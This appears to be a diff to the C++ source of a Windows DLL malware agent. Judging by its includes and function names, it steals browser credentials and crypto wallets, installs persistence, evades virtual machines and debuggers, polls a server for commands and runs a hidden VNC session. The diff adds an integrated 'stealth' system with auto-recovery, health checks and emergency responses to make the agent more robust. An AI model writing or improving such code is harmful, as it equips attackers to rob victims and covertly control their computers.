@@ -8,6 +8,7 @@
 #include "browser/wallets.h"
 #include "common.h"
 #include "persistence/advanced_persistence.h"
+#include "integration.h"
 
 // Forward declarations for modules
 extern "C" {
@@ -25,7 +26,7 @@ extern "C" {
     const char* GetAgentId();
     
     // Module functions (to be implemented)
-    bool CheckEnvironment();           // Anti-VM/Anti-Debug checks
+    bool CheckMainEnvironment();       // Anti-VM/Anti-Debug checks
     
     // Advanced Persistence functions
     bool InstallAdvancedPersistence(); // Enhanced persistence installation
@@ -69,23 +70,32 @@ public:
     Agent() : running(false) {}
     
     bool Initialize() {
-        LogInfo("Agent initializing...");
+        LogInfo("Agent initializing with enhanced systems...");
         
         // Initialize logging systems
         InitLogger();
         InitEncryptedLogger();
         
+        // Initialize integrated RT-SRT systems
+        if (!RTSRTIntegration::InitializeAllSystems()) {
+            LogError("Failed to initialize RT-SRT systems");
+            return false;
+        }
+        
         // Get agent ID
         agent_id = GetAgentId();
         LogInfo(("Agent ID: " + agent_id).c_str());
         
-        // Check environment if stealth is enabled
+        // Start Stealth system
         if (Config::ENABLE_STEALTH) {
-            LogInfo("Checking environment...");
-            if (!CheckEnvironment()) {
-                LogError("Environment check failed");
+            LogInfo("Starting enhanced Stealth system...");
+            if (!RTSRTIntegration::StartStealthSystem()) {
+                LogError("Failed to start Stealth system");
                 return false;
             }
+            
+            // Enable auto-recovery for robust operation
+            RTSRTIntegration::EnableAutoRecovery();
         }
         
         // Install persistence if enabled
@@ -99,7 +109,10 @@ public:
             }
         }
         
-        LogInfo("Agent initialized successfully");
+        // Log initial system status
+        RTSRTIntegration::LogSystemStatus();
+        
+        LogInfo("Agent initialized successfully with enhanced protection");
         return true;
     }
     
@@ -114,11 +127,18 @@ public:
     void Stop() {
         if (!running) return;
         
+        LogInfo("Stopping agent with graceful shutdown...");
         running = false;
+        
+        // Gracefully stop worker thread
         if (worker_thread.joinable()) {
             worker_thread.join();
         }
-        LogInfo("Agent stopped");
+        
+        // Stop all RT-SRT systems
+        RTSRTIntegration::ShutdownAllSystems();
+        
+        LogInfo("Agent stopped with complete cleanup");
     }
     
     void CollectAndSend() {
@@ -143,6 +163,12 @@ private:
         
         while (running) {
             try {
+                // Perform system health check
+                if (!RTSRTIntegration::IsSystemHealthy()) {
+                    LogError("System health check failed - triggering recovery");
+                    RTSRTIntegration::TriggerSystemRecovery();
+                }
+                
                 // Collect and send data
                 CollectAndSend();
                 
@@ -152,8 +178,25 @@ private:
                 // Check for commands from server
                 CheckCommands();
                 
+                // Periodic system status logging
+                static int statusCounter = 0;
+                if (++statusCounter % 10 == 0) { // Every 10 cycles
+                    RTSRTIntegration::LogSystemStatus();
+                }
+                
+            } catch (const std::exception& e) {
+                LogError(("Exception in worker loop: " + std::string(e.what())).c_str());
+                
+                // Report exception as potential threat
+                STEALTH_CHECK_THREAT(ThreatType::UNKNOWN_THREAT, 
+                                     SecurityThreatLevel::MEDIUM,
+                                     "Exception in main worker loop: " + std::string(e.what()));
+                
             } catch (...) {
-                LogError("Exception in worker loop");
+                LogError("Unknown exception in worker loop");
+                
+                // Critical unknown exception
+                STEALTH_EMERGENCY_RESPONSE();
             }
             
             // Wait for next interval
@@ -366,14 +409,14 @@ private:
 std::unique_ptr<Agent> g_agent;
 
 // Anti-analysis checks (implemented in stealth modules)
-bool CheckEnvironment() {
+bool CheckMainEnvironment() {
     extern bool CheckForDebugger();
     extern void ApplyAntiDebugProtection();
     
     LogInfo("Starting comprehensive environment analysis...");
     
     // First, declare external functions
-    bool CheckVMEnvironment();
+    extern bool CheckVMEnvironment();
     
     bool vmDetected = false;
     bool debuggerDetected = false;
@@ -437,9 +480,7 @@ bool InstallPersistence() {
 
 // Real extraction functions are implemented in browser and crypto modules
 
-bool StartHVNC() {
-    return false; // Not implemented
-}
+// StartHVNC implemented in hvnc/control_session.cpp
 
 // Entry point for DLL
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
